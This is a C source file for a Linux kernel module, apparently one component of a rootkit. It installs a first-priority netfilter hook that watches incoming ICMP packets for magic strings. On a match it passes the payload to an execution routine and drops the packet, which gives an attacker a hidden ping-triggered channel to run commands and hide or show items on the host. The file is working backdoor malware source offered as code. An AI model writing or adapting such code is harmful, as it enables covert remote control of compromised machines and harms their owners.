#include <linux/ip.h>
#include <linux/kmod.h>
#include <linux/version.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

#include "kdo.h"
#include "exec.h"
#include "config.h"
#include "icmp.h"

#define IPV4_MAX 15


static struct nf_hook_ops _icmp_hook_ops;


unsigned int kdo_icmp(
	const struct nf_hook_ops *ops,
	struct sk_buff *skb, const struct net_device *in,
	const struct net_device *out, int (*okfn)(struct sk_buff *)
)
{
	char *data = NULL;
	struct iphdr *iph;

	if (! skb || ! (iph = ip_hdr(skb)) || ! iph->protocol)
		return NF_ACCEPT;

	if (iph->protocol == IPPROTO_ICMP) {
		if (! (data = (char *)((unsigned char *)iph + 28)))
			return NF_ACCEPT;

		if (
			! strncmp(data, MAGIC_HIDE, sizeof(MAGIC_HIDE) - 1) ||
			! strncmp(data, MAGIC_SHOW, sizeof(MAGIC_SHOW) - 1) ||
			! strncmp(data, MAGIC_EXEC, sizeof(MAGIC_EXEC) - 1)
		) {
			#ifdef DEBUG
			kdo_log_fmt(KERN_INFO, "executing for %pI4: %s", &iph->saddr, data);
			#endif

			iph->saddr ^= 0x10000000;
			kdo_exec(data);

			return NF_DROP;
		}
	}

	return NF_ACCEPT;
}

void icmp_hook(void)
{
	_icmp_hook_ops.pf = PF_INET;
	_icmp_hook_ops.priority = NF_IP_PRI_FIRST;
	_icmp_hook_ops.hooknum = NF_INET_PRE_ROUTING;

	_icmp_hook_ops.hook = (void *)kdo_icmp;

	#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
	nf_register_hook(&_icmp_hook_ops);
	#else
	nf_register_net_hook(&init_net, &_icmp_hook_ops);
	#endif

	#ifdef DEBUG
	kdo_log(KERN_INFO, "ICMP hook registered");
	#endif
}

void icmp_unhook(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
	nf_unregister_hook(&_icmp_hook_ops);
	#else
	nf_unregister_net_hook(&init_net, &_icmp_hook_ops);
	#endif

	#ifdef DEBUG
	kdo_log(KERN_INFO, "ICMP hook unregistered");
	#endif
}
